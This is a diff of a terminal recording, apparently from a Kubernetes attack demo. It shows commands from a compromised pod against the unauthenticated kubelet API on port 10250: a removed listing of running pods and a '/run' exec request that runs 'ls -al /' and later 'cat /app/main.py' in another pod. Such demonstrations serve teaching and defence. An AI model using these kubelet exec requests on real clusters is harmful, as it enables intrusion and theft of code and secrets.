@@ -35,18 +35,6 @@
       "root@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      2.5,
-      "ping -c1 172.20.48.188"
-    ],
-    [
-      0.255811,
-      "\r\n"
-    ],
-    [
-      0.001107,
-      "PING 172.20.48.188 (172.20.48.188) 56(84) bytes of data.\r\n64 bytes from 172.20.48.188: icmp_seq=1 ttl=64 time=0.051 ms\r\n\r\n--- 172.20.48.188 ping statistics ---\r\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\r\nrtt min/avg/max/mdev = 0.051/0.051/0.051/0.000 ms\r\nroot@vulnweb-2569941405-q8v9r:/# "
-    ],
-    [
       1.087564,
       "c"
     ],
@@ -67,66 +55,6 @@
       "r"
     ],
     [
-      0.699192,
-      "\r\n\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
-    ],
-    [
-      1.0,
-      "curl -sk https://172.20.48.188:10250/"
-    ],
-    [
-      2.0,
-      "\r\n"
-    ],
-    [
-      0.011769,
-      "404 page not found\r\n"
-    ],
-    [
-      0.000489,
-      "root@vulnweb-2569941405-q8v9r:/# "
-    ],
-    [
-      2.0,
-      "curl -sk https://172.20.48.188:10250/runningpods/"
-    ],
-    [
-      2.0,
-      "\r\n"
-    ],
-    [
-      0.012901,
-      "{\"kind\":\"PodList\",\"apiVersion\":\"v1\",\"metadata\":{},\"items\":[{\"metadata\":{\"name\":\"vulnweb-2569941405-q8v9r\",\"namespace\":\"default\",\"uid\":\"4474ff10-ba02-11e7-801a-06d2c9432f28\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"vulnweb\",\"image\":\"bradgeesaman/vulnapp@sha256:d4dd9e9f5cc247d82ee5624e5127acd13b6458b8fe40b49783d2122a146107ce\",\"resources\":{}}]},\"status\":{}},{\"metadata\":{\"name\":\"auditcon-1212018461-w6vnb\",\"namespace\":\"default\",\"uid\":\"d34289fc-ba00-11e7-801a-06d2c9432f28\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"auditcon\",\"image\":\"bradgeesaman/auditcon@sha256:921430c0d2bdedd2854a3b72967812ed74c5775edd23df4c772870c202d54e12\",\"resources\":{}}]},\"status\":{}},{\"metadata\":{\"name\":\"kube-dns-479524115-bn35l\",\"namespace\":\"kube-system\",\"uid\":\"d42bbf44-b9fd-11e7-aa33-06d2c9432f28\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"sidecar\",\"image\":\"gcr.io/google_containers/k8s-dns-sidecar-amd64@sha256:97074c951046e37d3cbb98b82ae85ed15704a290cce66a8314e7f846404edde9\",\"resources\":{}},{\"nam"
-    ],
-    [
-      0.000126,
-      "e\":\"dnsmasq\",\"image\":\"gcr.io/google_containers/k8s-dns-dnsmasq-nanny-amd64@sha256:aeeb994acbc505eabc7415187cd9edb38cbb5364dc1c2fc748154576464b3dc2\",\"resources\":{}},{\"name\":\"kubedns\",\"image\":\"gcr.io/google_containers/k8s-dns-kube-dns-amd64@sha256:40790881bbe9ef4ae4ff7fe8b892498eecb7fe6dcc22661402f271e03f7de344\",\"resources\":{}}]},\"status\":{}},{\"metadata\":{\"name\":\"calico-node-pvj8m\",\"namespace\":\"kube-system\",\"uid\":\"1efb8c56-b9fe-11e7-801a-06d2c9432f28\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"calico-node\",\"image\":\"calico/node@sha256:347d618c90f0d6ccc0a1d8a91c8b2f67dcb1494c8e25bd683573c677d6e51477\",\"resources\":{}},{\"name\":\"install-cni\",\"image\":\"calico/cni@sha256:a33d3304c789612612d24ec701a734115903b5ab885dc964a6cc8aa627f5656c\",\"resources\":{}}]},\"status\":{}},{\"metadata\":{\"name\":\"kube-proxy-ip-172-20-48-188.ec2.internal\",\"namespace\":\"kube-system\",\"uid\":\"d43ae90adbfd80db2b956c1719221bd3\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"kube-proxy\",\"image\":\"gcr.io/google_containers/kube-proxy@"
-    ],
-    [
-      9.1e-05,
-      "sha256:5373a1c294c9ffb2e842d74d3df8fcc5bed68c02af3fb3611c2fd71a411a68fe\",\"resources\":{}}]},\"status\":{}},{\"metadata\":{\"name\":\"azure-vote-front-1874756303-c3s69\",\"namespace\":\"default\",\"uid\":\"5c873214-ba02-11e7-801a-06d2c9432f28\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"azure-vote-front\",\"image\":\"microsoft/azure-vote-front@sha256:1c7abbebcfc00dab064c7a5ea7ddb9ad3c6a9ecc5c8a99a42cebc2aa833e1fe7\",\"resources\":{}}]},\"status\":{}}]}\r\nroot@vulnweb-2569941405-q8v9r:/# "
-    ],
-    [
-      4.0,
-      "c"
-    ],
-    [
-      0.191283,
-      "l"
-    ],
-    [
-      0.046815,
-      "e"
-    ],
-    [
-      0.064847,
-      "a"
-    ],
-    [
-      0.078894,
-      "r"
-    ],
-    [
       0.08367,
       "\r\n\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
     ],
@@ -143,7 +71,7 @@
       "root@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      2.0,
+      0.8,
       "v"
     ],
     [
@@ -235,7 +163,7 @@
       "\u001b[?25l\u001b[25;78H5\u001b[24;15H\u001b[?12l\u001b[?25h"
     ],
     [
-      2.0,
+      0.8,
       "\u001b[?25l\r\n/azure\u001b[25;73H\u001b[K\u001b[25;1H"
     ],
     [
@@ -243,11 +171,11 @@
       "\u001b[1;24r\u001b[24;1H\r\n\u001b[1;25r\u001b[24;1H-11e7-801a-06d2c9432f28\",\"creationTimestamp\":null},\"spec\":{\"containers\":[{\"name\":\"azure-vo\u001b[25;1H\u001b[K\u001b[25;73H1,2333\u001b[8CAll\u001b[24;83H\u001b[?12l\u001b[?25h"
     ],
     [
-      2.0,
+      1.0,
       "\u001b[?25l\r\n/azure\u001b[25;73H\u001b[K\u001b[25;1H\u001b[1;24r\u001b[24;1H\r\n\u001b[1;25r\u001b[24;1Hte-front\",\"image\":\"microsoft/azure-vote-front@sha256:1c7abbebcfc00dab064c7a5ea7ddb9ad3c6a9\u001b[25;1H\u001b[K\u001b[25;73H1,2370\u001b[8CAll\u001b[24;30H\u001b[?12l\u001b[?25h"
     ],
     [
-      2.0,
+      1.0,
       "\u0007\u001b[?25l\u001b[25;73H\u001b[K\u001b[25;1H:\u001b[?12l\u001b[?25h"
     ],
     [
@@ -295,11 +223,11 @@
       "\u001b[3;J\u001b[H\u001b[2Jroot@vulnweb-2569941405-q8v9r:/# "
     ],
     [
-      2.0,
+      0.8,
       "curl -sk https://172.20.48.188:10250/run/default/azure-vo \rte-front-1874756303-c3s69/azure-vote-front -d \"cmd=ls -al /\""
     ],
     [
-      5.0,
+      4.0,
       "\r\n"
     ],
     [
@@ -331,7 +259,7 @@
       "p\"\b"
     ],
     [
-      2.0,
+      1.5,
       "\r\n"
     ],
     [
@@ -431,47 +359,47 @@
       "\b"
     ],
     [
-      0.349712,
+      0.039712,
       "\b"
     ],
     [
-      0.314946,
+      0.034946,
       "\b\u001b[1P /app/main.py\"\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
     ],
     [
-      0.168607,
+      0.038607,
       "\b\u001b[1P /app/main.py\"\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
     ],
     [
-      0.146316,
+      0.036316,
       "\b\u001b[1P /app/main.py\"\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
     ],
     [
-      0.135185,
+      0.035185,
       "\u001b[1P/app/main.py\"\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
     ],
     [
-      0.156782,
+      0.036782,
       "\b\u001b[1P /app/main.py\"\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
     ],
     [
-      0.148078,
+      0.038078,
       "\b\u001b[1P /app/main.py\"\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
     ],
     [
-      0.080038,
+      0.040038,
       "c /app/main.py\"\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
     ],
     [
-      0.11391,
+      0.04391,
       "a /app/main.py\"\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
     ],
     [
-      0.088567,
+      0.048567,
       "t /app/main.py\"\b\b\b\b\b\b\b\b\b\b\b\b\b\b"
     ],
     [
-      0.07645,
+      2.0,
       "\r\n"
     ],
     [
